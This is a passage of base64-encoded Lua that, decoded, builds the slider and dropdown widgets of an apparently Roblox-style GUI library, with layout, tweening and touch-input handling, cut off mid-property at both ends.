CAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCA1LCAwLCAzNyk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0xMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0WEFsaWdubWVudCA9IEVudW0uVGV4dFhBbGlnbm1lbnQuTGVmdDsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgQXV0b21hdGljU2l6ZSA9IEVudW0uQXV0b21hdGljU2l6ZS5YWTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgZW5kIAoKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgIm5hbWUiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzbGlkZXJfb2JqZWN0IiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigwLCA0LCAwLCAyMyk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDAsIDAsIDEyKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJTGlzdExheW91dCIgLCB7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmcgPSBkaW0oMCwgNyk7CiAgICAgICAgICAgICAgICAgICAgU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXI7CiAgICAgICAgICAgICAgICAgICAgRmlsbERpcmVjdGlvbiA9IEVudW0uRmlsbERpcmVjdGlvbi5Ib3Jpem9udGFsCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJzbGlkZXIiIF0gPSBsaWJyYXJ5OmNyZWF0ZSggIlRleHRCdXR0b24iICwgewogICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigxLCAwKTsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInJpZ2h0X2NvbXBvbmVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC00LCAwLCA0KTsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigzMywgMzMsIDM1KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAic2xpZGVyIiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTkpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJmaWxsIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJzbGlkZXIiIF07CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAuNSwgMCwgMCwgNCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gdGhlbWVzLnByZXNldC5hY2NlbnQKICAgICAgICAgICAgICAgIH0pOyAgbGlicmFyeTphcHBseV90aGVtZShpdGVtc1sgImZpbGwiIF0sICJhY2NlbnQiLCAiQmFja2dyb3VuZENvbG9yMyIpOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImZpbGwiIF07CiAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDk5OSkKICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICBpdGVtc1sgImNpcmNsZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiRnJhbWUiICwgewogICAgICAgICAgICAgICAgICAgIEFuY2hvclBvaW50ID0gdmVjMigwLjUsIDAuNSk7CiAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJmaWxsIiBdOwogICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLjUsIDApOwogICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigwLCAxMiwgMCwgMTIpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNDQsIDI0NCwgMjQ0KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlDb3JuZXIiICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiY2lyY2xlIiBdOwogICAgICAgICAgICAgICAgICAgIENvcm5lclJhZGl1cyA9IGRpbSgwLCA5OTkpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBQYWRkaW5nVG9wID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaXRlbXNbICJ2YWx1ZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICBGb250RmFjZSA9IGZvbnRzLnNtYWxsOwogICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoNzIsIDcyLCA3Myk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFRleHQgPSAiNTAlIjsKICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgInNsaWRlcl9vYmplY3QiIF07CiAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDYsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxOwogICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5SaWdodDsKICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNjsKICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSVBhZGRpbmciICwgewogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAidmFsdWUiIF07CiAgICAgICAgICAgICAgICAgICAgUGFkZGluZ1JpZ2h0ID0gZGltKDAsIDUpOwogICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICB9KTsgICAgICAgICAgICAgICAgCiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5jaGFuZ2V0ZXh0KHRleHQpCiAgICAgICAgICAgICAgICBpdGVtc1snbmFtZSddLlRleHQgPSB0ZXh0CiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGZ1bmN0aW9uIGNmZy5zZXQodmFsdWUpCiAgICAgICAgICAgICAgICBjZmcudmFsdWUgPSBjbGFtcChsaWJyYXJ5OnJvdW5kKHZhbHVlLCBjZmcuaW50ZXJ2YWxzKSwgY2ZnLm1pbiwgY2ZnLm1heCkKCiAgICAgICAgICAgICAgICBsaWJyYXJ5OnR3ZWVuKGl0ZW1zWyAiZmlsbCIgXSwge1NpemUgPSBkaW0yKChjZmcudmFsdWUgLSBjZmcubWluKSAvIChjZmcubWF4IC0gY2ZnLm1pbiksIGNmZy52YWx1ZSA9PSBjZmcubWluIGFuZCAwIG9yIC00LCAwLCAyKX0sIEVudW0uRWFzaW5nU3R5bGUuTGluZWFyLCAwLjA1KQogICAgICAgICAgICAgICAgaXRlbXNbICJ2YWx1ZSIgXS5UZXh0ID0gdG9zdHJpbmcoY2ZnLnZhbHVlKSAuLiBjZmcuc3VmZml4CgogICAgICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLnZhbHVlCiAgICAgICAgICAgICAgICBjZmcuY2FsbGJhY2soZmxhZ3NbY2ZnLmZsYWddKQogICAgICAgICAgICBlbmQKCiAgICAgICAgICAgIGl0ZW1zWyAic2xpZGVyIiBdLklucHV0QmVnYW46Q29ubmVjdChmdW5jdGlvbihJbnB1dCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIElucHV0LlVzZXJJbnB1dFR5cGUgfj0gRW51bS5Vc2VySW5wdXRUeXBlLlRvdWNoIHRoZW4gcmV0dXJuIGVuZAogICAgICAgICAgICAgICAgY2ZnLmRyYWdnaW5nID0gdHJ1ZSAKICAgICAgICAgICAgICAgIGxpYnJhcnk6dHdlZW4oaXRlbXNbICJ2YWx1ZSIgXSwge1RleHRDb2xvcjMgPSByZ2IoMjU1LCAyNTUsIDI1NSl9LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIDAuMikKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgbGlicmFyeTpjb25uZWN0aW9uKHVpcy5JbnB1dENoYW5nZWQsIGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICAgICAgaWYgY2ZnLmRyYWdnaW5nIGFuZCBpbnB1dC5Vc2VySW5wdXRUeXBlID09IEVudW0uVXNlcklucHV0VHlwZS5Ub3VjaCB0aGVuIAogICAgICAgICAgICAgICAgICAgIGxvY2FsIHNpemVfeCA9IChpbnB1dC5Qb3NpdGlvbi5YIC0gaXRlbXNbICJzbGlkZXIiIF0uQWJzb2x1dGVQb3NpdGlvbi5YKSAvIGl0ZW1zWyAic2xpZGVyIiBdLkFic29sdXRlU2l6ZS5YCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgdmFsdWUgPSAoKGNmZy5tYXggLSBjZmcubWluKSAqIHNpemVfeCkgKyBjZmcubWluCiAgICAgICAgICAgICAgICAgICAgY2ZnLnNldCh2YWx1ZSkKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQpCgogICAgICAgICAgICBsaWJyYXJ5OmNvbm5lY3Rpb24odWlzLklucHV0RW5kZWQsIGZ1bmN0aW9uKGlucHV0KQogICAgICAgICAgICAgICAgaWYgaW5wdXQuVXNlcklucHV0VHlwZSA9PSBFbnVtLlVzZXJJbnB1dFR5cGUuVG91Y2ggdGhlbgogICAgICAgICAgICAgICAgICAgIGNmZy5kcmFnZ2luZyA9IGZhbHNlCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTp0d2VlbihpdGVtc1sgInZhbHVlIiBdLCB7VGV4dENvbG9yMyA9IHJnYig3MiwgNzIsIDczKX0sIEVudW0uRWFzaW5nU3R5bGUuUXVhZCwgMC4yKSAKICAgICAgICAgICAgICAgIGVuZCAKICAgICAgICAgICAgZW5kKQoKICAgICAgICAgICAgaWYgY2ZnLnNlcGVyYXRvciB0aGVuIAogICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgQW5jaG9yUG9pbnQgPSB2ZWMyKDAsIDEpOwogICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IHNlbGYuaXRlbXNbICJlbGVtZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICBQb3NpdGlvbiA9IGRpbTIoMCwgMCwgMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIDEsIDAsIDEpOwogICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigzNiwgMzYsIDM3KQogICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgIGVuZCAKCiAgICAgICAgICAgIGNmZy5zZXQoY2ZnLmRlZmF1bHQpCiAgICAgICAgICAgIGNvbmZpZ19mbGFnc1tjZmcuZmxhZ10gPSBjZmcuc2V0CgogICAgICAgICAgICByZXR1cm4gc2V0bWV0YXRhYmxlKGNmZywgbGlicmFyeSkKICAgICAgICBlbmQgCgogICAgICAgIGZ1bmN0aW9uIGxpYnJhcnk6ZHJvcGRvd24ob3B0aW9ucykgCiAgICAgICAgICAgIGxvY2FsIGNmZyA9IHsKICAgICAgICAgICAgICAgIG5hbWUgPSBvcHRpb25zLm5hbWUgb3IgbmlsOwogICAgICAgICAgICAgICAgaW5mbyA9IG9wdGlvbnMuaW5mbyBvciBuaWw7CiAgICAgICAgICAgICAgICBmbGFnID0gb3B0aW9ucy5mbGFnIG9yIGxpYnJhcnk6bmV4dF9mbGFnKCk7CiAgICAgICAgICAgICAgICBvcHRpb25zID0gb3B0aW9ucy5pdGVtcyBvciB7IiJ9OwogICAgICAgICAgICAgICAgY2FsbGJhY2sgPSBvcHRpb25zLmNhbGxiYWNrIG9yIGZ1bmN0aW9uKCkgZW5kOwogICAgICAgICAgICAgICAgbXVsdGkgPSBvcHRpb25zLm11bHRpIG9yIGZhbHNlOwogICAgICAgICAgICAgICAgc2Nyb2xsaW5nID0gb3B0aW9ucy5zY3JvbGxpbmcgb3IgZmFsc2U7CgogICAgICAgICAgICAgICAgd2lkdGggPSBvcHRpb25zLndpZHRoIG9yIDEzMDsKCiAgICAgICAgICAgICAgICAtLSBJZ25vcmUgdGhlc2UgCiAgICAgICAgICAgICAgICBvcGVuID0gZmFsc2U7CiAgICAgICAgICAgICAgICBvcHRpb25faW5zdGFuY2VzID0ge307CiAgICAgICAgICAgICAgICBtdWx0aV9pdGVtcyA9IHt9OwogICAgICAgICAgICAgICAgaWdub3JlID0gb3B0aW9ucy5pZ25vcmUgb3IgZmFsc2U7CiAgICAgICAgICAgICAgICBpdGVtcyA9IHt9OwogICAgICAgICAgICAgICAgeV9zaXplOwogICAgICAgICAgICAgICAgc2VwZXJhdG9yID0gb3B0aW9ucy5zZXBlcmF0b3Igb3Igb3B0aW9ucy5TZXBlcmF0b3Igb3IgdHJ1ZTsKICAgICAgICAgICAgfSAgIAoKICAgICAgICAgICAgY2ZnLmRlZmF1bHQgPSBvcHRpb25zLmRlZmF1bHQgb3IgKGNmZy5tdWx0aSBhbmQge2NmZy5pdGVtc1sxXX0pIG9yIGNmZy5pdGVtc1sxXSBvciAiTm9uZSIKICAgICAgICAgICAgZmxhZ3NbY2ZnLmZsYWddID0gY2ZnLmRlZmF1bHQKCiAgICAgICAgICAgIGxvY2FsIGl0ZW1zID0gY2ZnLml0ZW1zOyBkbyAKICAgICAgICAgICAgICAgIC0tIEVsZW1lbnQKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImRyb3Bkb3duX29iamVjdCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dEJ1dHRvbiIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIEZvbnRGYWNlID0gZm9udHMuc21hbGw7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlckNvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dCA9ICIiOwogICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBzZWxmLml0ZW1zWyAiZWxlbWVudHMiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMSwgMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWTsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dFNpemUgPSAxNDsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGl0ZW1zWyAibmFtZSIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5zbWFsbDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigyNDUsIDI0NSwgMjQ1KTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIkRyb3Bkb3duIjsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJkcm9wZG93bl9vYmplY3QiIF07CiAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICBTaXplID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDE7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBBdXRvbWF0aWNTaXplID0gRW51bS5BdXRvbWF0aWNTaXplLlhZOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE2OwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaWYgY2ZnLmluZm8gdGhlbiAKICAgICAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJpbmZvIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0TGFiZWwiICwgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5zbWFsbDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRDb2xvcjMgPSByZ2IoMTMwLCAxMzAsIDEzMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0V3JhcHBlZCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gY2ZnLmluZm87CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBQYXJlbnQgPSBpdGVtc1sgImRyb3Bkb3duX29iamVjdCIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIE5hbWUgPSAiXDAiOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDAsIDUsIDAsIDE3KTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDEsIC0xMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRleHRYQWxpZ25tZW50ID0gRW51bS5UZXh0WEFsaWdubWVudC5MZWZ0OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyU2l6ZVBpeGVsID0gMDsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9tYXRpY1NpemUgPSBFbnVtLkF1dG9tYXRpY1NpemUuWFk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUZXh0U2l6ZSA9IDE2OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFja2dyb3VuZENvbG9yMyA9IHJnYigyNTUsIDI1NSwgMjU1KQogICAgICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICBlbmQgCgogICAgICAgICAgICAgICAgICAgIGxpYnJhcnk6Y3JlYXRlKCAiVUlQYWRkaW5nIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJuYW1lIiBdOwogICAgICAgICAgICAgICAgICAgICAgICBQYWRkaW5nUmlnaHQgPSBkaW0oMCwgNSk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhZGRpbmdMZWZ0ID0gZGltKDAsIDUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJyaWdodF9jb21wb25lbnRzIiBdID0gbGlicmFyeTpjcmVhdGUoICJGcmFtZSIgLCB7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAiZHJvcGRvd25fb2JqZWN0IiBdOwogICAgICAgICAgICAgICAgICAgICAgICBOYW1lID0gIlwwIjsKICAgICAgICAgICAgICAgICAgICAgICAgUG9zaXRpb24gPSBkaW0yKDEsIDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJDb2xvcjMgPSByZ2IoMCwgMCwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFNpemUgPSBkaW0yKDAsIDAsIDEsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBCb3JkZXJTaXplUGl4ZWwgPSAwOwogICAgICAgICAgICAgICAgICAgICAgICBCYWNrZ3JvdW5kQ29sb3IzID0gcmdiKDI1NSwgMjU1LCAyNTUpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgbGlicmFyeTpjcmVhdGUoICJVSUxpc3RMYXlvdXQiICwgewogICAgICAgICAgICAgICAgICAgICAgICBGaWxsRGlyZWN0aW9uID0gRW51bS5GaWxsRGlyZWN0aW9uLkhvcml6b250YWw7CiAgICAgICAgICAgICAgICAgICAgICAgIEhvcml6b250YWxBbGlnbm1lbnQgPSBFbnVtLkhvcml6b250YWxBbGlnbm1lbnQuUmlnaHQ7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgUGFkZGluZyA9IGRpbSgwLCA3KTsKICAgICAgICAgICAgICAgICAgICAgICAgU29ydE9yZGVyID0gRW51bS5Tb3J0T3JkZXIuTGF5b3V0T3JkZXIKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBpdGVtc1sgImRyb3Bkb3duIiBdID0gbGlicmFyeTpjcmVhdGUoICJUZXh0QnV0dG9uIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgRm9udEZhY2UgPSBmb250cy5zbWFsbDsKICAgICAgICAgICAgICAgICAgICAgICAgVGV4dENvbG9yMyA9IHJnYigwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgQm9yZGVyQ29sb3IzID0gcmdiKDAsIDAsIDApOwogICAgICAgICAgICAgICAgICAgICAgICBUZXh0ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIEF1dG9CdXR0b25Db2xvciA9IGZhbHNlOwogICAgICAgICAgICAgICAgICAgICAgICBBbmNob3JQb2ludCA9IHZlYzIoMSwgMCk7CiAgICAgICAgICAgICAgICAgICAgICAgIFBhcmVudCA9IGl0ZW1zWyAicmlnaHRfY29tcG9uZW50cyIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgTmFtZSA9ICJcMCI7CiAgICAgICAgICAgICAgICAgICAgICAgIFBvc2l0aW9uID0gZGltMigxLCAwLCAwLCAwKTsKICAgICAgICAgICAgICAgICAgICAgICAgU2l6ZSA9IGRpbTIoMCwgY2ZnLndpZHRoLCAwLCAxNik7CiAgICAgICAgICAgICAgICAgICAgICAgIEJvcmRlclNpemVQaXhlbCA9IDA7CiAgICAgICAgICAgICAgICAgICAgICAgIFRleHRTaXplID0gMTQ7CiAgICAgICAgICAgICAgICAgICAgICAgIEJhY2tncm91bmRDb2xvcjMgPSByZ2IoMzMsIDMzLCAzNSkKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICBsaWJyYXJ5OmNyZWF0ZSggIlVJQ29ybmVyIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgUGFyZW50ID0gaXRlbXNbICJkcm9wZG93biIgXTsKICAgICAgICAgICAgICAgICAgICAgICAgQ29ybmVyUmFkaXVzID0gZGltKDAsIDQpCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgaXRlbXNbICJzdWJfdGV4dCIgXSA9IGxpYnJhcnk6Y3JlYXRlKCAiVGV4dExhYmVsIiAsIHsKICAgICAgICAgICAgICAgICAgICAgICAgRm9